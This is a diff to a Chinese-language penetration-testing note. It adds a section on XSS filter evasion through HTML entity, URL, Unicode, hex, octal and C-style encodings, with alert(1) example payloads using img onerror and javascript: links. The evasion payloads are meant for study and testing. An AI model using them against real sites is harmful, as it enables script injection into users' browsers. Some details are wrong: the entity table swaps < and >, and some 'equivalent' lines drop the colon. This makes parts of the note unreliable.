@@ -156,10 +156,128 @@ fuzz的范围：属性内-标签内-标签外，不分先后
 
 ### 编码绕过
 
-* HTML实体编码
-* URL编码
-* Unicode编码
-* 十六进制
+> ECMAScrip是Javascript的一个标准
+
+#### HTML实体编码
+
+Entity（实体）编码有两种格式：&entityName和&#entityNumber
+
+&entityName："&"开头，";"结尾，以语义的形式描述字符。
+
+&#entityNumber："&"开头，";"结尾，以语义的形式描述字符。以编号的形式描述字符。此编号可以为十进制或十六进制(以”&#x”开头)等数字格式。
+
+举例：
+
+    符号  entityName  entityNumber
+    >       &lt;        &#60;
+    <       &gt;        &#62;
+    !       &excl;      &#33;
+    "       &quot;      &#34;
+    #       &num;       &#35;
+    &       8amp;       &#38;
+    
+##### payload举例
+
+例子一：
+
+    <img src="1" onerror="alert(1)">
+    
+等效于
+
+    <img src="1" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+    
+等效于
+
+    <img src=1 onerror&#61;alert(1)>
+    
+> 属于标签本身结构的部分不会被解析
+
+例子二：
+
+    <a href="javascript:alert(1)">click me</a>
+    
+等效于
+
+    <a href="j&#x61;vascript:alert(1)">click me</a>
+    
+例子三：
+
+    <img src="1" onerror="alert(1)">
+    
+等效于
+
+    <img src="1"
+    
+    onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+等效于
+
+    <img src="1"
+    onerror="&#00000000000000097;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+> 允许在&#之后插入任意多个0
+
+例子四：Entity编码的;可以去除。
+
+下面的语句是等效的
+
+    <a href="javascriptalert(1)">click me</a>
+    <a href="j&#x61vascript:&#37&#54&#49&#37&#54&#99&#37&#54&#53&#37&#55&#50&#37&#55&#52&#37&#50&#56&#37&#51&#49&#37&#50&#57">click me</a>
+    
+> 不同格式的Entity编码可以混用
+
+#### URL编码
+
+针对URL类型的属性，允许进行一次URL编码,URL类型的属性，通俗理解就是链接的属性
+
+例子一：
+
+    <a href="javascript:alert(1)">click me</a>
+
+等效于
+
+    <a href="j&#x61;vascript:%61%6c%65%72%74%28%31%29">click me</a>
+    
+例子二：URL编码的部分可以进行第二次Entity编码。注：不能无限套娃
+
+下面的语句都是等效的
+
+    <a href="javascriptalert(1)">click me</a>
+    <a href="j&#x61;vascript:alert(1)">click me</a>
+    <a href="j&#x61;vascript:%61%6c%65%72%74%28%31%29">click me</a>
+    <a href="j&#x61;vascript:&#37;&#54;&#49;&#37;&#54;&#99;&#37;&#54;&#53;&#37;&#55;&#50;&#37;&#55;&#52;&#37;&#50;&#56;&#37;&#51;&#49;&#37;&#50;&#57;">click me</a>
+
+例子三：URI类型的属性忽略Tab和回车符。Tab符和回车符也可以再进行一次Entity编码
+
+下面的语句都是等效的
+
+    <a href="javascript:alert(1)"> click me</a>
+    <a href="j&#x61;vascript:&#37;&#54;&#49;&#37;&#54;&#99;&#37;&#54;&#53;&#37;&#55;&#50;&#37;&#55;&#52;&#37;&#50;&#56;&#37;&#51;&#49;&#37;&#50;&#57;">click me</a>
+
+
+#### Unicode编码
+
+如\u0065可表示字符e，属于ECMAScript编码。
+
+Unicode编码可以给方法名编码，而其他编码只能给字符串编码
+
+举例：
+
+    <script>
+    \u0061lert("test");
+    </script>
+
+#### 十六进制
+
+两个十六进制数字，例如”e”编码为”\x65”，同样不属于ECMAScript，但是在解析底层，c语言中有很好的支持。
+    
+#### 八进制
+
+三个八进制数字，例如”e”编码为”\145″，该语法不属于ECMAScript,但是基本所有的浏览器都支持。
+
+#### C语言编码
+
+对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r)，公认的ECMAScript编码。
 
 ### rasp绕过
 
